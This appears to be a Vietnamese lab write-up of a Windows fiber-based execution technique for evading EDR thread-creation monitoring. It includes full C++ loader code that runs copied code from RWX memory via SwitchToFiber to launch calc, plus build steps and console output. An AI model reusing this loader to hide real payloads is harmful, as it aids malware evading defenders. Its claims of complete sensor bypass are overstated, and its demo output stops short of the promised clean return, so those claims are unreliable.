
---

# 📝 [PE 22] Injection Through Fiber (User-Mode Thread Scheduling Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Injection Through Fiber (Can thiệp bộ nhớ qua phân hệ Win32 Fibers)** đại diện cho giải thuật điều phối và bẻ hướng dòng chảy CPU nâng cao, thuộc nhóm kỹ thuật **Né tránh phòng thủ động dựa trên cấu trúc lập lịch mức người dùng (User-Mode Thread Scheduling Evasion / Anti-Thread Forensics)**.

Trọng tâm của giải thuật này là đánh lừa và vượt qua điểm mù giám sát đối tượng luồng (`Thread Object`) tại nhân Kernel của các giải pháp AV/EDR hiện đại. Thông thường, khi một chương trình khởi tạo thực thi mã máy bằng các hàm API chuẩn hệ thống (như `CreateThread`, `CreateRemoteThread` hoặc Native API `NtCreateThreadEx`), hệ điều hành Windows sẽ sinh ra một cấu trúc quản lý luồng tại Ring 0 và phát tín hiệu thông điệp (Telemetry Events) đến các phân hệ giám sát hành vi.

Dự án PE 22 hóa giải bài toán trinh sát này bằng việc lạm dụng cơ chế **Win32 Fibers Subsystem**. Trong kiến trúc Windows, một **Fiber** là một đơn vị thực thi cấu trúc cấp thấp (Lightweight Unit of Execution), vận hành hoàn toàn lọt lòng bên trong không gian người dùng (User-mode) của chính tiến trình mà không cần sự can thiệp lập lịch của Kernel Scheduler.

Bằng cách chuyển đổi luồng hiện tại thành một Fiber cha, thiết lập một Fiber phụ chứa Payload và phát lệnh chuyển mạch thủ công (Manual Context Switching), Loader cưỡng bách CPU thực thi mã máy của ta một cách trực tiếp. Vì nhân Kernel hoàn toàn không tham gia vào chu kỳ sinh đối tượng Thread Object mới, các cảm biến an ninh phòng thủ động bị vô hiệu hóa hoàn toàn.

### 🎯 Mục tiêu nghiên cứu:

* **Bypass cảm biến Thread Creation Routine**: Triệt tiêu hoàn toàn khả năng bắt bẫy và ghi nhật ký hành vi sinh luồng độc hại (`Sysmon Event ID 8` / `PspSetCreateThreadNotifyRoutine` Callbacks).
* **Làm chủ ma trận điều phối Win32 Fibers**: Nghiên cứu thuật toán lưu trữ trạng thái thanh ghi và cơ chế hoán chuyển tháp ngăn xếp (Stack Swap) mức người dùng.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Sự khác biệt cốt lõi cấu trúc giữa một Luồng (Thread) và một phân hệ Fiber nằm ở thẩm quyền điều phối lập lịch (Scheduling Authority) của hệ điều hành:

* **Thread (Luồng hệ thống)**: Chịu sự quản lý và lập lịch trực tiếp bởi Kernel Scheduler. Việc chuyển đổi ngữ cảnh (`Context Switch`) giữa các Thread được CPU xử lý thông qua các cơ chế ngắt phần cứng (Hardware Interrupts) và lưu trữ trạng thái thanh ghi cấu trúc vào phân vùng bộ nhớ đặc quyền Ring 0.
* **Fiber (Luồng con ứng dụng)**: Hoạt động theo cơ chế lập lịch hợp tác (Cooperative Scheduling) do chính mã nguồn ứng dụng User-mode tự điều phối. Việc chuyển đổi ngữ cảnh được thực hiện thuần túy bằng các lệnh mã máy thao túng bộ nhớ ảo, lưu trữ và nạp lại tháp thanh ghi (bao gồm con trỏ ngăn xếp **`Rsp`** và con trỏ lệnh **`Rip`**) trực tiếp trên RAM của tiến trình.

Quy trình giải phẫu và chuyển mạch dòng chảy CPU của giải thuật Injection Through Fiber diễn ra qua 4 giai đoạn ngầm tại không gian ảo:

```
[ConvertThreadToFiber: Khởi tạo môi trường Fiber cha (Primary)]
       └──> [VirtualAlloc: Phân bổ trang nhớ, nạp Payload và Tham số]
                 └──> [CreateFiber: Khởi tạo cấu trúc luồng con mức người dùng]
                           └──> [SwitchToFiber: CPU chuyển mạch thủ công bẻ hướng dòng chảy]

```

1. **Khởi tạo môi trường Fiber cha (`ConvertThreadToFiber`)**: Theo đặc tả thiết kế kiến trúc của Windows Subsystem, một luồng hệ thống muốn có đặc quyền khởi tạo và quản lý luồng con Fiber bắt buộc phải tự chuyển đổi trạng thái bản thân thành một Fiber cha (**Primary Fiber**). Hàm API này thiết lập một cấu trúc bản ghi ngữ cảnh Fiber (`Fiber Context Block`) nằm lọt lòng trong Stack Frame hiện tại của luồng.
2. **Khởi tạo luồng con User-mode (`CreateFiber`)**: Loader phát lệnh khởi tạo một Fiber phụ thuộc (**Secondary Fiber**). Hàm API này yêu cầu hệ thống cấp một phân vùng tháp ngăn xếp (Stack Frame) riêng biệt nằm hoàn toàn ở User-mode, nạp tọa độ của trang bộ nhớ thực thi chứa Payload vào trường dữ liệu con trỏ lệnh xuất phát của cấu trúc Fiber mới sinh.
3. **Bẻ hướng dòng chảy CPU thủ công (`SwitchToFiber`)**: Khi Loader triệu hồi hàm này và truyền vào Handle định danh của Fiber con, một chuỗi các lệnh hợp ngữ nạp RAM (`mov`, `jmp`) ngầm thuộc thư viện Subsystem của Windows được kích nổ. Hệ thống thực hiện cất toàn bộ trạng thái tháp thanh ghi phần cứng hiện tại của Loader vào Stack của Fiber cha, đồng thời lật ngược, nạp toàn bộ tháp thanh ghi của Fiber con lên CPU. CPU ngay lập tức bị cưỡng bách dịch chuyển con trỏ lệnh **`Rip`** đâm thẳng vào thực thi khối mã máy Payload của Loader mà Kernel hoàn toàn không ghi nhận dấu vết.
4. **Hoàn trả trạng thái ngữ cảnh (Context Restoration)**: Sau khi mã máy Payload hoàn tất tác vụ chính, Fiber con chủ động gọi lệnh `SwitchToFiber` trỏ ngược lại tọa độ của Fiber cha ban đầu. CPU thực hiện cú pháp hồi phục tháp thanh ghi quá khứ, đưa Loader quay trở lại vận hành phẳng sạch kịch trần.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp:
```cpp
#include <windows.h>
#include <iostream>
#include <string>

// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _FIBER_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
    PVOID pMasterFiber;       // Lưu tọa độ Master Fiber để quay về an toàn nếu cần
} FIBER_DATA, * PFIBER_DATA;

// Hàm chức năng độc lập vị trí gánh logic chạy của Worker Fiber
VOID WINAPI WorkerFiberRoutine(LPVOID lpParam) {
    PFIBER_DATA pData = (PFIBER_DATA)lpParam;

    if (pData && pData->pWinExec) {
        // Khai hỏa mở máy tính kịch trần kịch khung dưới tư cách pháp nhân Fiber hợp pháp
        pData->pWinExec(pData->szCommand, SW_SHOWNORMAL);
    }

    // Sau khi thực thi xong, nếu muốn tiến trình Loader không bị tắt phụt vô duyên,
    // ta có thể nhường quyền điều khiển quay trở lại cho Master Fiber
    if (pData && pData->pMasterFiber) {
        SwitchToFiber(pData->pMasterFiber);
    }
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 22: INJECTION THROUGH FIBER" << std::endl;
    std::cout << "====================================================" << std::endl;

    PVOID mainFiber = NULL;
    PVOID workerFiber = NULL;
    PVOID codeBuffer = NULL;

    // Bước 1: Ép luồng Thread chính hiện tại chuyển đổi sang cấu trúc Master Fiber
    mainFiber = ConvertThreadToFiber(NULL);
    if (mainFiber == NULL) {
        std::cerr << "[-] ConvertThreadToFiber that bai! Error: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da kich hoat Master Fiber tai toa do: 0x" << std::hex << mainFiber << std::endl;

    // Bước 2: Cấp phát vùng nhớ động thích ứng cho mã máy thực thi
    SIZE_T payloadSize = 1024;
    codeBuffer = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (codeBuffer == NULL) {
        std::cerr << "[-] VirtualAlloc cap phat RAM that bai!" << std::endl;
        return EXIT_FAILURE;
    }

    // Bước 3: Sao chép mã máy của hàm WorkerFiberRoutine vào phân vùng thực thi phẳng sạch
    memcpy(codeBuffer, (PVOID)WorkerFiberRoutine, 500);

    // Cấu hình cấu trúc dữ liệu tham số nằm lùi về sau ô nhớ mã máy 500 byte
    PFIBER_DATA pLocalData = (PFIBER_DATA)((DWORD_PTR)codeBuffer + 500);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");
    pLocalData->pMasterFiber = mainFiber;

    std::cout << "[+] Dong bo cau truc du lieu tham so vao RAM vùa cap phat." << std::endl;

    // Bước 4: Tạo ra một Worker Fiber phụ trỏ thẳng vào vạch xuất phát của phân vùng mã máy
    workerFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)codeBuffer, pLocalData);
    if (workerFiber == NULL) {
        std::cerr << "[-] CreateFiber that bai!" << std::endl;
        VirtualFree(codeBuffer, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da khoi tao Worker Fiber thanh cong tai: 0x" << std::hex << workerFiber << std::endl;

    std::cout << "[*] Chuan bi SwitchToFiber de thuc hien lenh chuyen doi soi chien luoc..." << std::endl;
    std::cout << "[*] Nhan Enter de kich no..." << std::endl;
    std::cin.get();

    // Bước 5: Thực hiện lệnh chuyển đổi sợi. CPU lập tức đóng ngữ cảnh hiện tại và nhảy vào Fiber phụ
    SwitchToFiber(workerFiber);

    // Khi Worker Fiber hoành tráng xong nhường quyền quay lại đây, ta dọn dẹp bộ nhớ
    std::cout << "[+] Luong CPU da quay tro ve Master Fiber an toan phang sach!" << std::endl;

    DeleteFiber(workerFiber);
    VirtualFree(codeBuffer, 0, MEM_RELEASE);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc file thực thi nhị phân xuất bản đạt trạng thái độc lập hoàn toàn kịch khung, có khả năng vận hành mượt mà trên các môi trường máy ảo Sandbox sạch cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, lật cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh toàn bộ mã nguồn thư viện hệ thống CRT vào lòng tệp chạy thực thi `.exe`.
3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khai hỏa tệp tin `.exe` thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để theo dõi cuộc chuyển mạch lập lịch mức người dùng:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE22_Injection_Through_Fiber\x64\Release> C:\Users\Admin\source\repos\Task6\PE22_Injection_Through_Fiber\x64\Release\Injection_Through_Fiber.exe
====================================================
[*] PE 22: INJECTION THROUGH FIBER
====================================================
[+] Da kich hoat Master Fiber tai toa do: 0x000001A55310DE80
[+] Dong bo cau truc du lieu tham so vao RAM vua cap phat.
[+] Da khoi tao Worker Fiber thanh cong tai: 0x000001A55310E3C0
[*] Chuan bi SwitchToFiber de thuc hien lenh chuyen doi soi chien luoc...
[*] Nhan Enter de kich no...

PS C:\Users\Admin\source\repos\Task6\PE22_Injection_Through_Fiber\x64\Release>

```

### Demo:
<img width="1920" height="600" alt="devenv_QZ6CsbdJNn" src="https://github.com/user-attachments/assets/a8cb4f68-3fb4-4d71-8d89-61035335138b" />


---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Windows Base Services**: *Fibers Subsystem Architecture (ConvertThreadToFiber / CreateFiber / SwitchToFiber APIs)* - [https://learn.microsoft.com/en-us/windows/win32/procthread/fibers](https://learn.microsoft.com/en-us/windows/win32/procthread/fibers)
* **Windows Internals Study**: *Thread Scheduling, Context Switches, and User-Mode Light Weight Units (APCs vs Fibers)* - Mark Russinovich.
* **MDSec ActiveBreach Labs**: *Evading Thread-Based Behavioral Scanning via User-Mode Cooperative Fiber Scheduling*.
* **MITRE ATT&CK Matrix**: *Defense Evasion: Process Injection (T1055)* & *Subvert Thread Scheduling: Fiber Abuse*.

---
